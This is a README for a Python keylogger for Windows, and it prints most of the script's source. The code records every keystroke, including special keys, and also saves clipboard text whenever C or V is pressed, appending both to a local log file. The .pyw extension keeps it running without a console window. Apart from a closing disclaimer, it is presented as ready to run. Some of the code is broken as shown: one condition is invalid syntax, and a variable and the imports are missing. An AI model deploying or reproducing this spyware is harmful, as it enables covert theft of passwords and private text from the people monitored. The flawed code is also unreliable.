# Python Keylogger

**File:** `keylogger.pyw`

**Python Version:** `3.12`

**Author:** `memecoder`

**Platform:** `Windows`

---

### Overview

This script is a basic keylogger designed to capture and log keystrokes on a Windows system. It also includes functionality to log clipboard contents when certain keys (C, V) are pressed. The captured data is written to a file named `result.log`.

### Dependencies

- `ctypes`: For accessing clipboard data.
- `pynput`: For capturing keyboard events.

### Features

1. **Key Logging**:
   - Logs both regular keystrokes and special keys (like Enter, Shift, Ctrl, etc.).
   - Uses a dictionary to map special keys to readable strings.

2. **Clipboard Logging**:
   - Logs the clipboard content when either 'c', 'v', 'C', 'V' is pressed, provided there's text data available in the clipboard.

3. **File Logging**:
   - Appends logged keystrokes and clipboard data to `result.log`.

### How It Works

1. **Special Keys Dictionary**:
   - A dictionary maps special keys to readable strings for easier identification in the logs.

2. **Clipboard Access**:
   - Uses `ctypes` to access the Windows clipboard and fetch text data.

3. **Key Press Handling**:
   - The `on_press` function is called whenever a key is pressed. It checks if the key is in the `special_keys` dictionary or if it's a character key.
   - If the key is 'C' or 'V', the script retrieves and logs clipboard contents.

4. **Starting the Listener**:
   - The script starts a `keyboard.Listener` to monitor and log keystrokes. It keeps running and logging until the script is terminated.

### Code Details

- **Imports**:
  - `ctypes` for clipboard interaction.
  - `pynput` for keyboard events.

- **Special Keys Mapping**:
  ```python
    # Special keys dictionary
    special_keys = {
        Key.alt: " [Alt] ",
        Key.alt_l: " [Alt_L] ",
        Key.alt_r: " [Alt_R] ",
        Key.alt_gr: " [AltGr] ",
        Key.backspace: " [Backspace] ",
        Key.caps_lock: " [CapsLock] ",
        Key.cmd: " [Cmd] ",
        Key.cmd_l: " [Cmd_L] ",
        Key.cmd_r: " [Cmd_R] ",
        Key.ctrl: " [Ctrl] ",
        Key.ctrl_l: " [Ctrl_L] ",
        Key.ctrl_r: " [Ctrl_R] ",
        Key.delete: " [Delete] ",
        Key.down: " [Down] ",
        Key.end: " [End] ",
        Key.enter: " \n ",
        Key.esc: " [Esc] ",
        Key.f1: " [F1] ",
        Key.f2: " [F2] ",
        Key.f3: " [F3] ",
        Key.f4: " [F4] ",
        Key.f5: " [F5] ",
        Key.f6: " [F6] ",
        Key.f7: " [F7] ",
        Key.f8: " [F8] ",
        Key.f9: " [F9] ",
        Key.f10: " [F10] ",
        Key.f11: " [F11] ",
        Key.f12: " [F12] ",
        Key.home: " [Home] ",
        Key.left: " [Left] ",
        Key.page_down: " [PageDown] ",
        Key.page_up: " [PageUp] ",
        Key.right: " [Right] ",
        Key.shift: " [Shift] ",
        Key.shift_l: " [Shift_L] ",
        Key.shift_r: " [Shift_R] ",
        Key.space: " ",
        Key.tab: " [Tab] ",
        Key.up: " [Up] ",
        Key.insert: " [Insert] ",
        Key.menu: " [Menu] ",
        Key.num_lock: " [NumLock] ",
        Key.pause: " [Pause] ",
        Key.print_screen: " [PrintScreen] ",
        Key.scroll_lock: " [ScrollLock] "
    }
  ```

- **Clipboard Function**:
  ```python
    # Function to get clipboard data
    def get_clipboard():
        kernel32 = ctypes.windll.kernel32
        user32 = ctypes.windll.user32
        CF_TEXT = 1
        kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
        kernel32.GlobalLock.restype = ctypes.c_void_p
        kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
        user32.GetClipboardData.restype = ctypes.c_void_p
        user32.OpenClipboard(0)
        IsClipboardFormatAvailable = user32.IsClipboardFormatAvailable
        GetClipboardData = user32.GetClipboardData
        CloseClipboard = user32.CloseClipboard
        try:
            if IsClipboardFormatAvailable(CF_TEXT):
                data = GetClipboardData(CF_TEXT)
                data_locked = kernel32.GlobalLock(data)
                text = ctypes.c_char_p(data_locked)
                value = text.value
                kernel32.GlobalUnlock(data_locked)
                return value.decode('utf-8', errors='ignore')
        finally:
            CloseClipboard()
  ```

- **Key Press Handler**:
  ```python
    # Function to handle key press events
    def on_press(key):
        pressed_keys.add(key)
        with open("result.log", "a", encoding='utf-8') as file:
            try:
                if key in special_keys:
                    file.write(special_keys[key])
                elif hasattr(key, 'char') and key.char and key.char.lower() in 'c', 'v', 'C', 'V':
                    clipboard_data = get_clipboard()
                    if clipboard_data:
                        file.write("\n[Clipboard]: " + str(clipboard_data) + " \n ")
                    else:
                        pass
                else:
                    file.write(key.char)
            except AttributeError:
                file.write(str(key))
  ```

- **Listener**:
  ```python
  with keyboard.Listener(on_press=on_press) as listener:
      listener.join()
  ```

### Usage

1. **Execution**:
   - Run the script using Python: `python keylogger.pyw`.
   - It will start logging keystrokes and clipboard data to `result.log`.

2. **Stopping**:
   - The script will continue running until manually terminated.

### Important Notes

- **Disclaimer**:
  - This script can be used for legitimate purposes such as monitoring your own machine. Unauthorized use to record someone else's keystrokes or clipboard data is illegal.
  
- **Security**:
  - Ensure that you have the necessary permissions and legal rights before running or deploying this script.

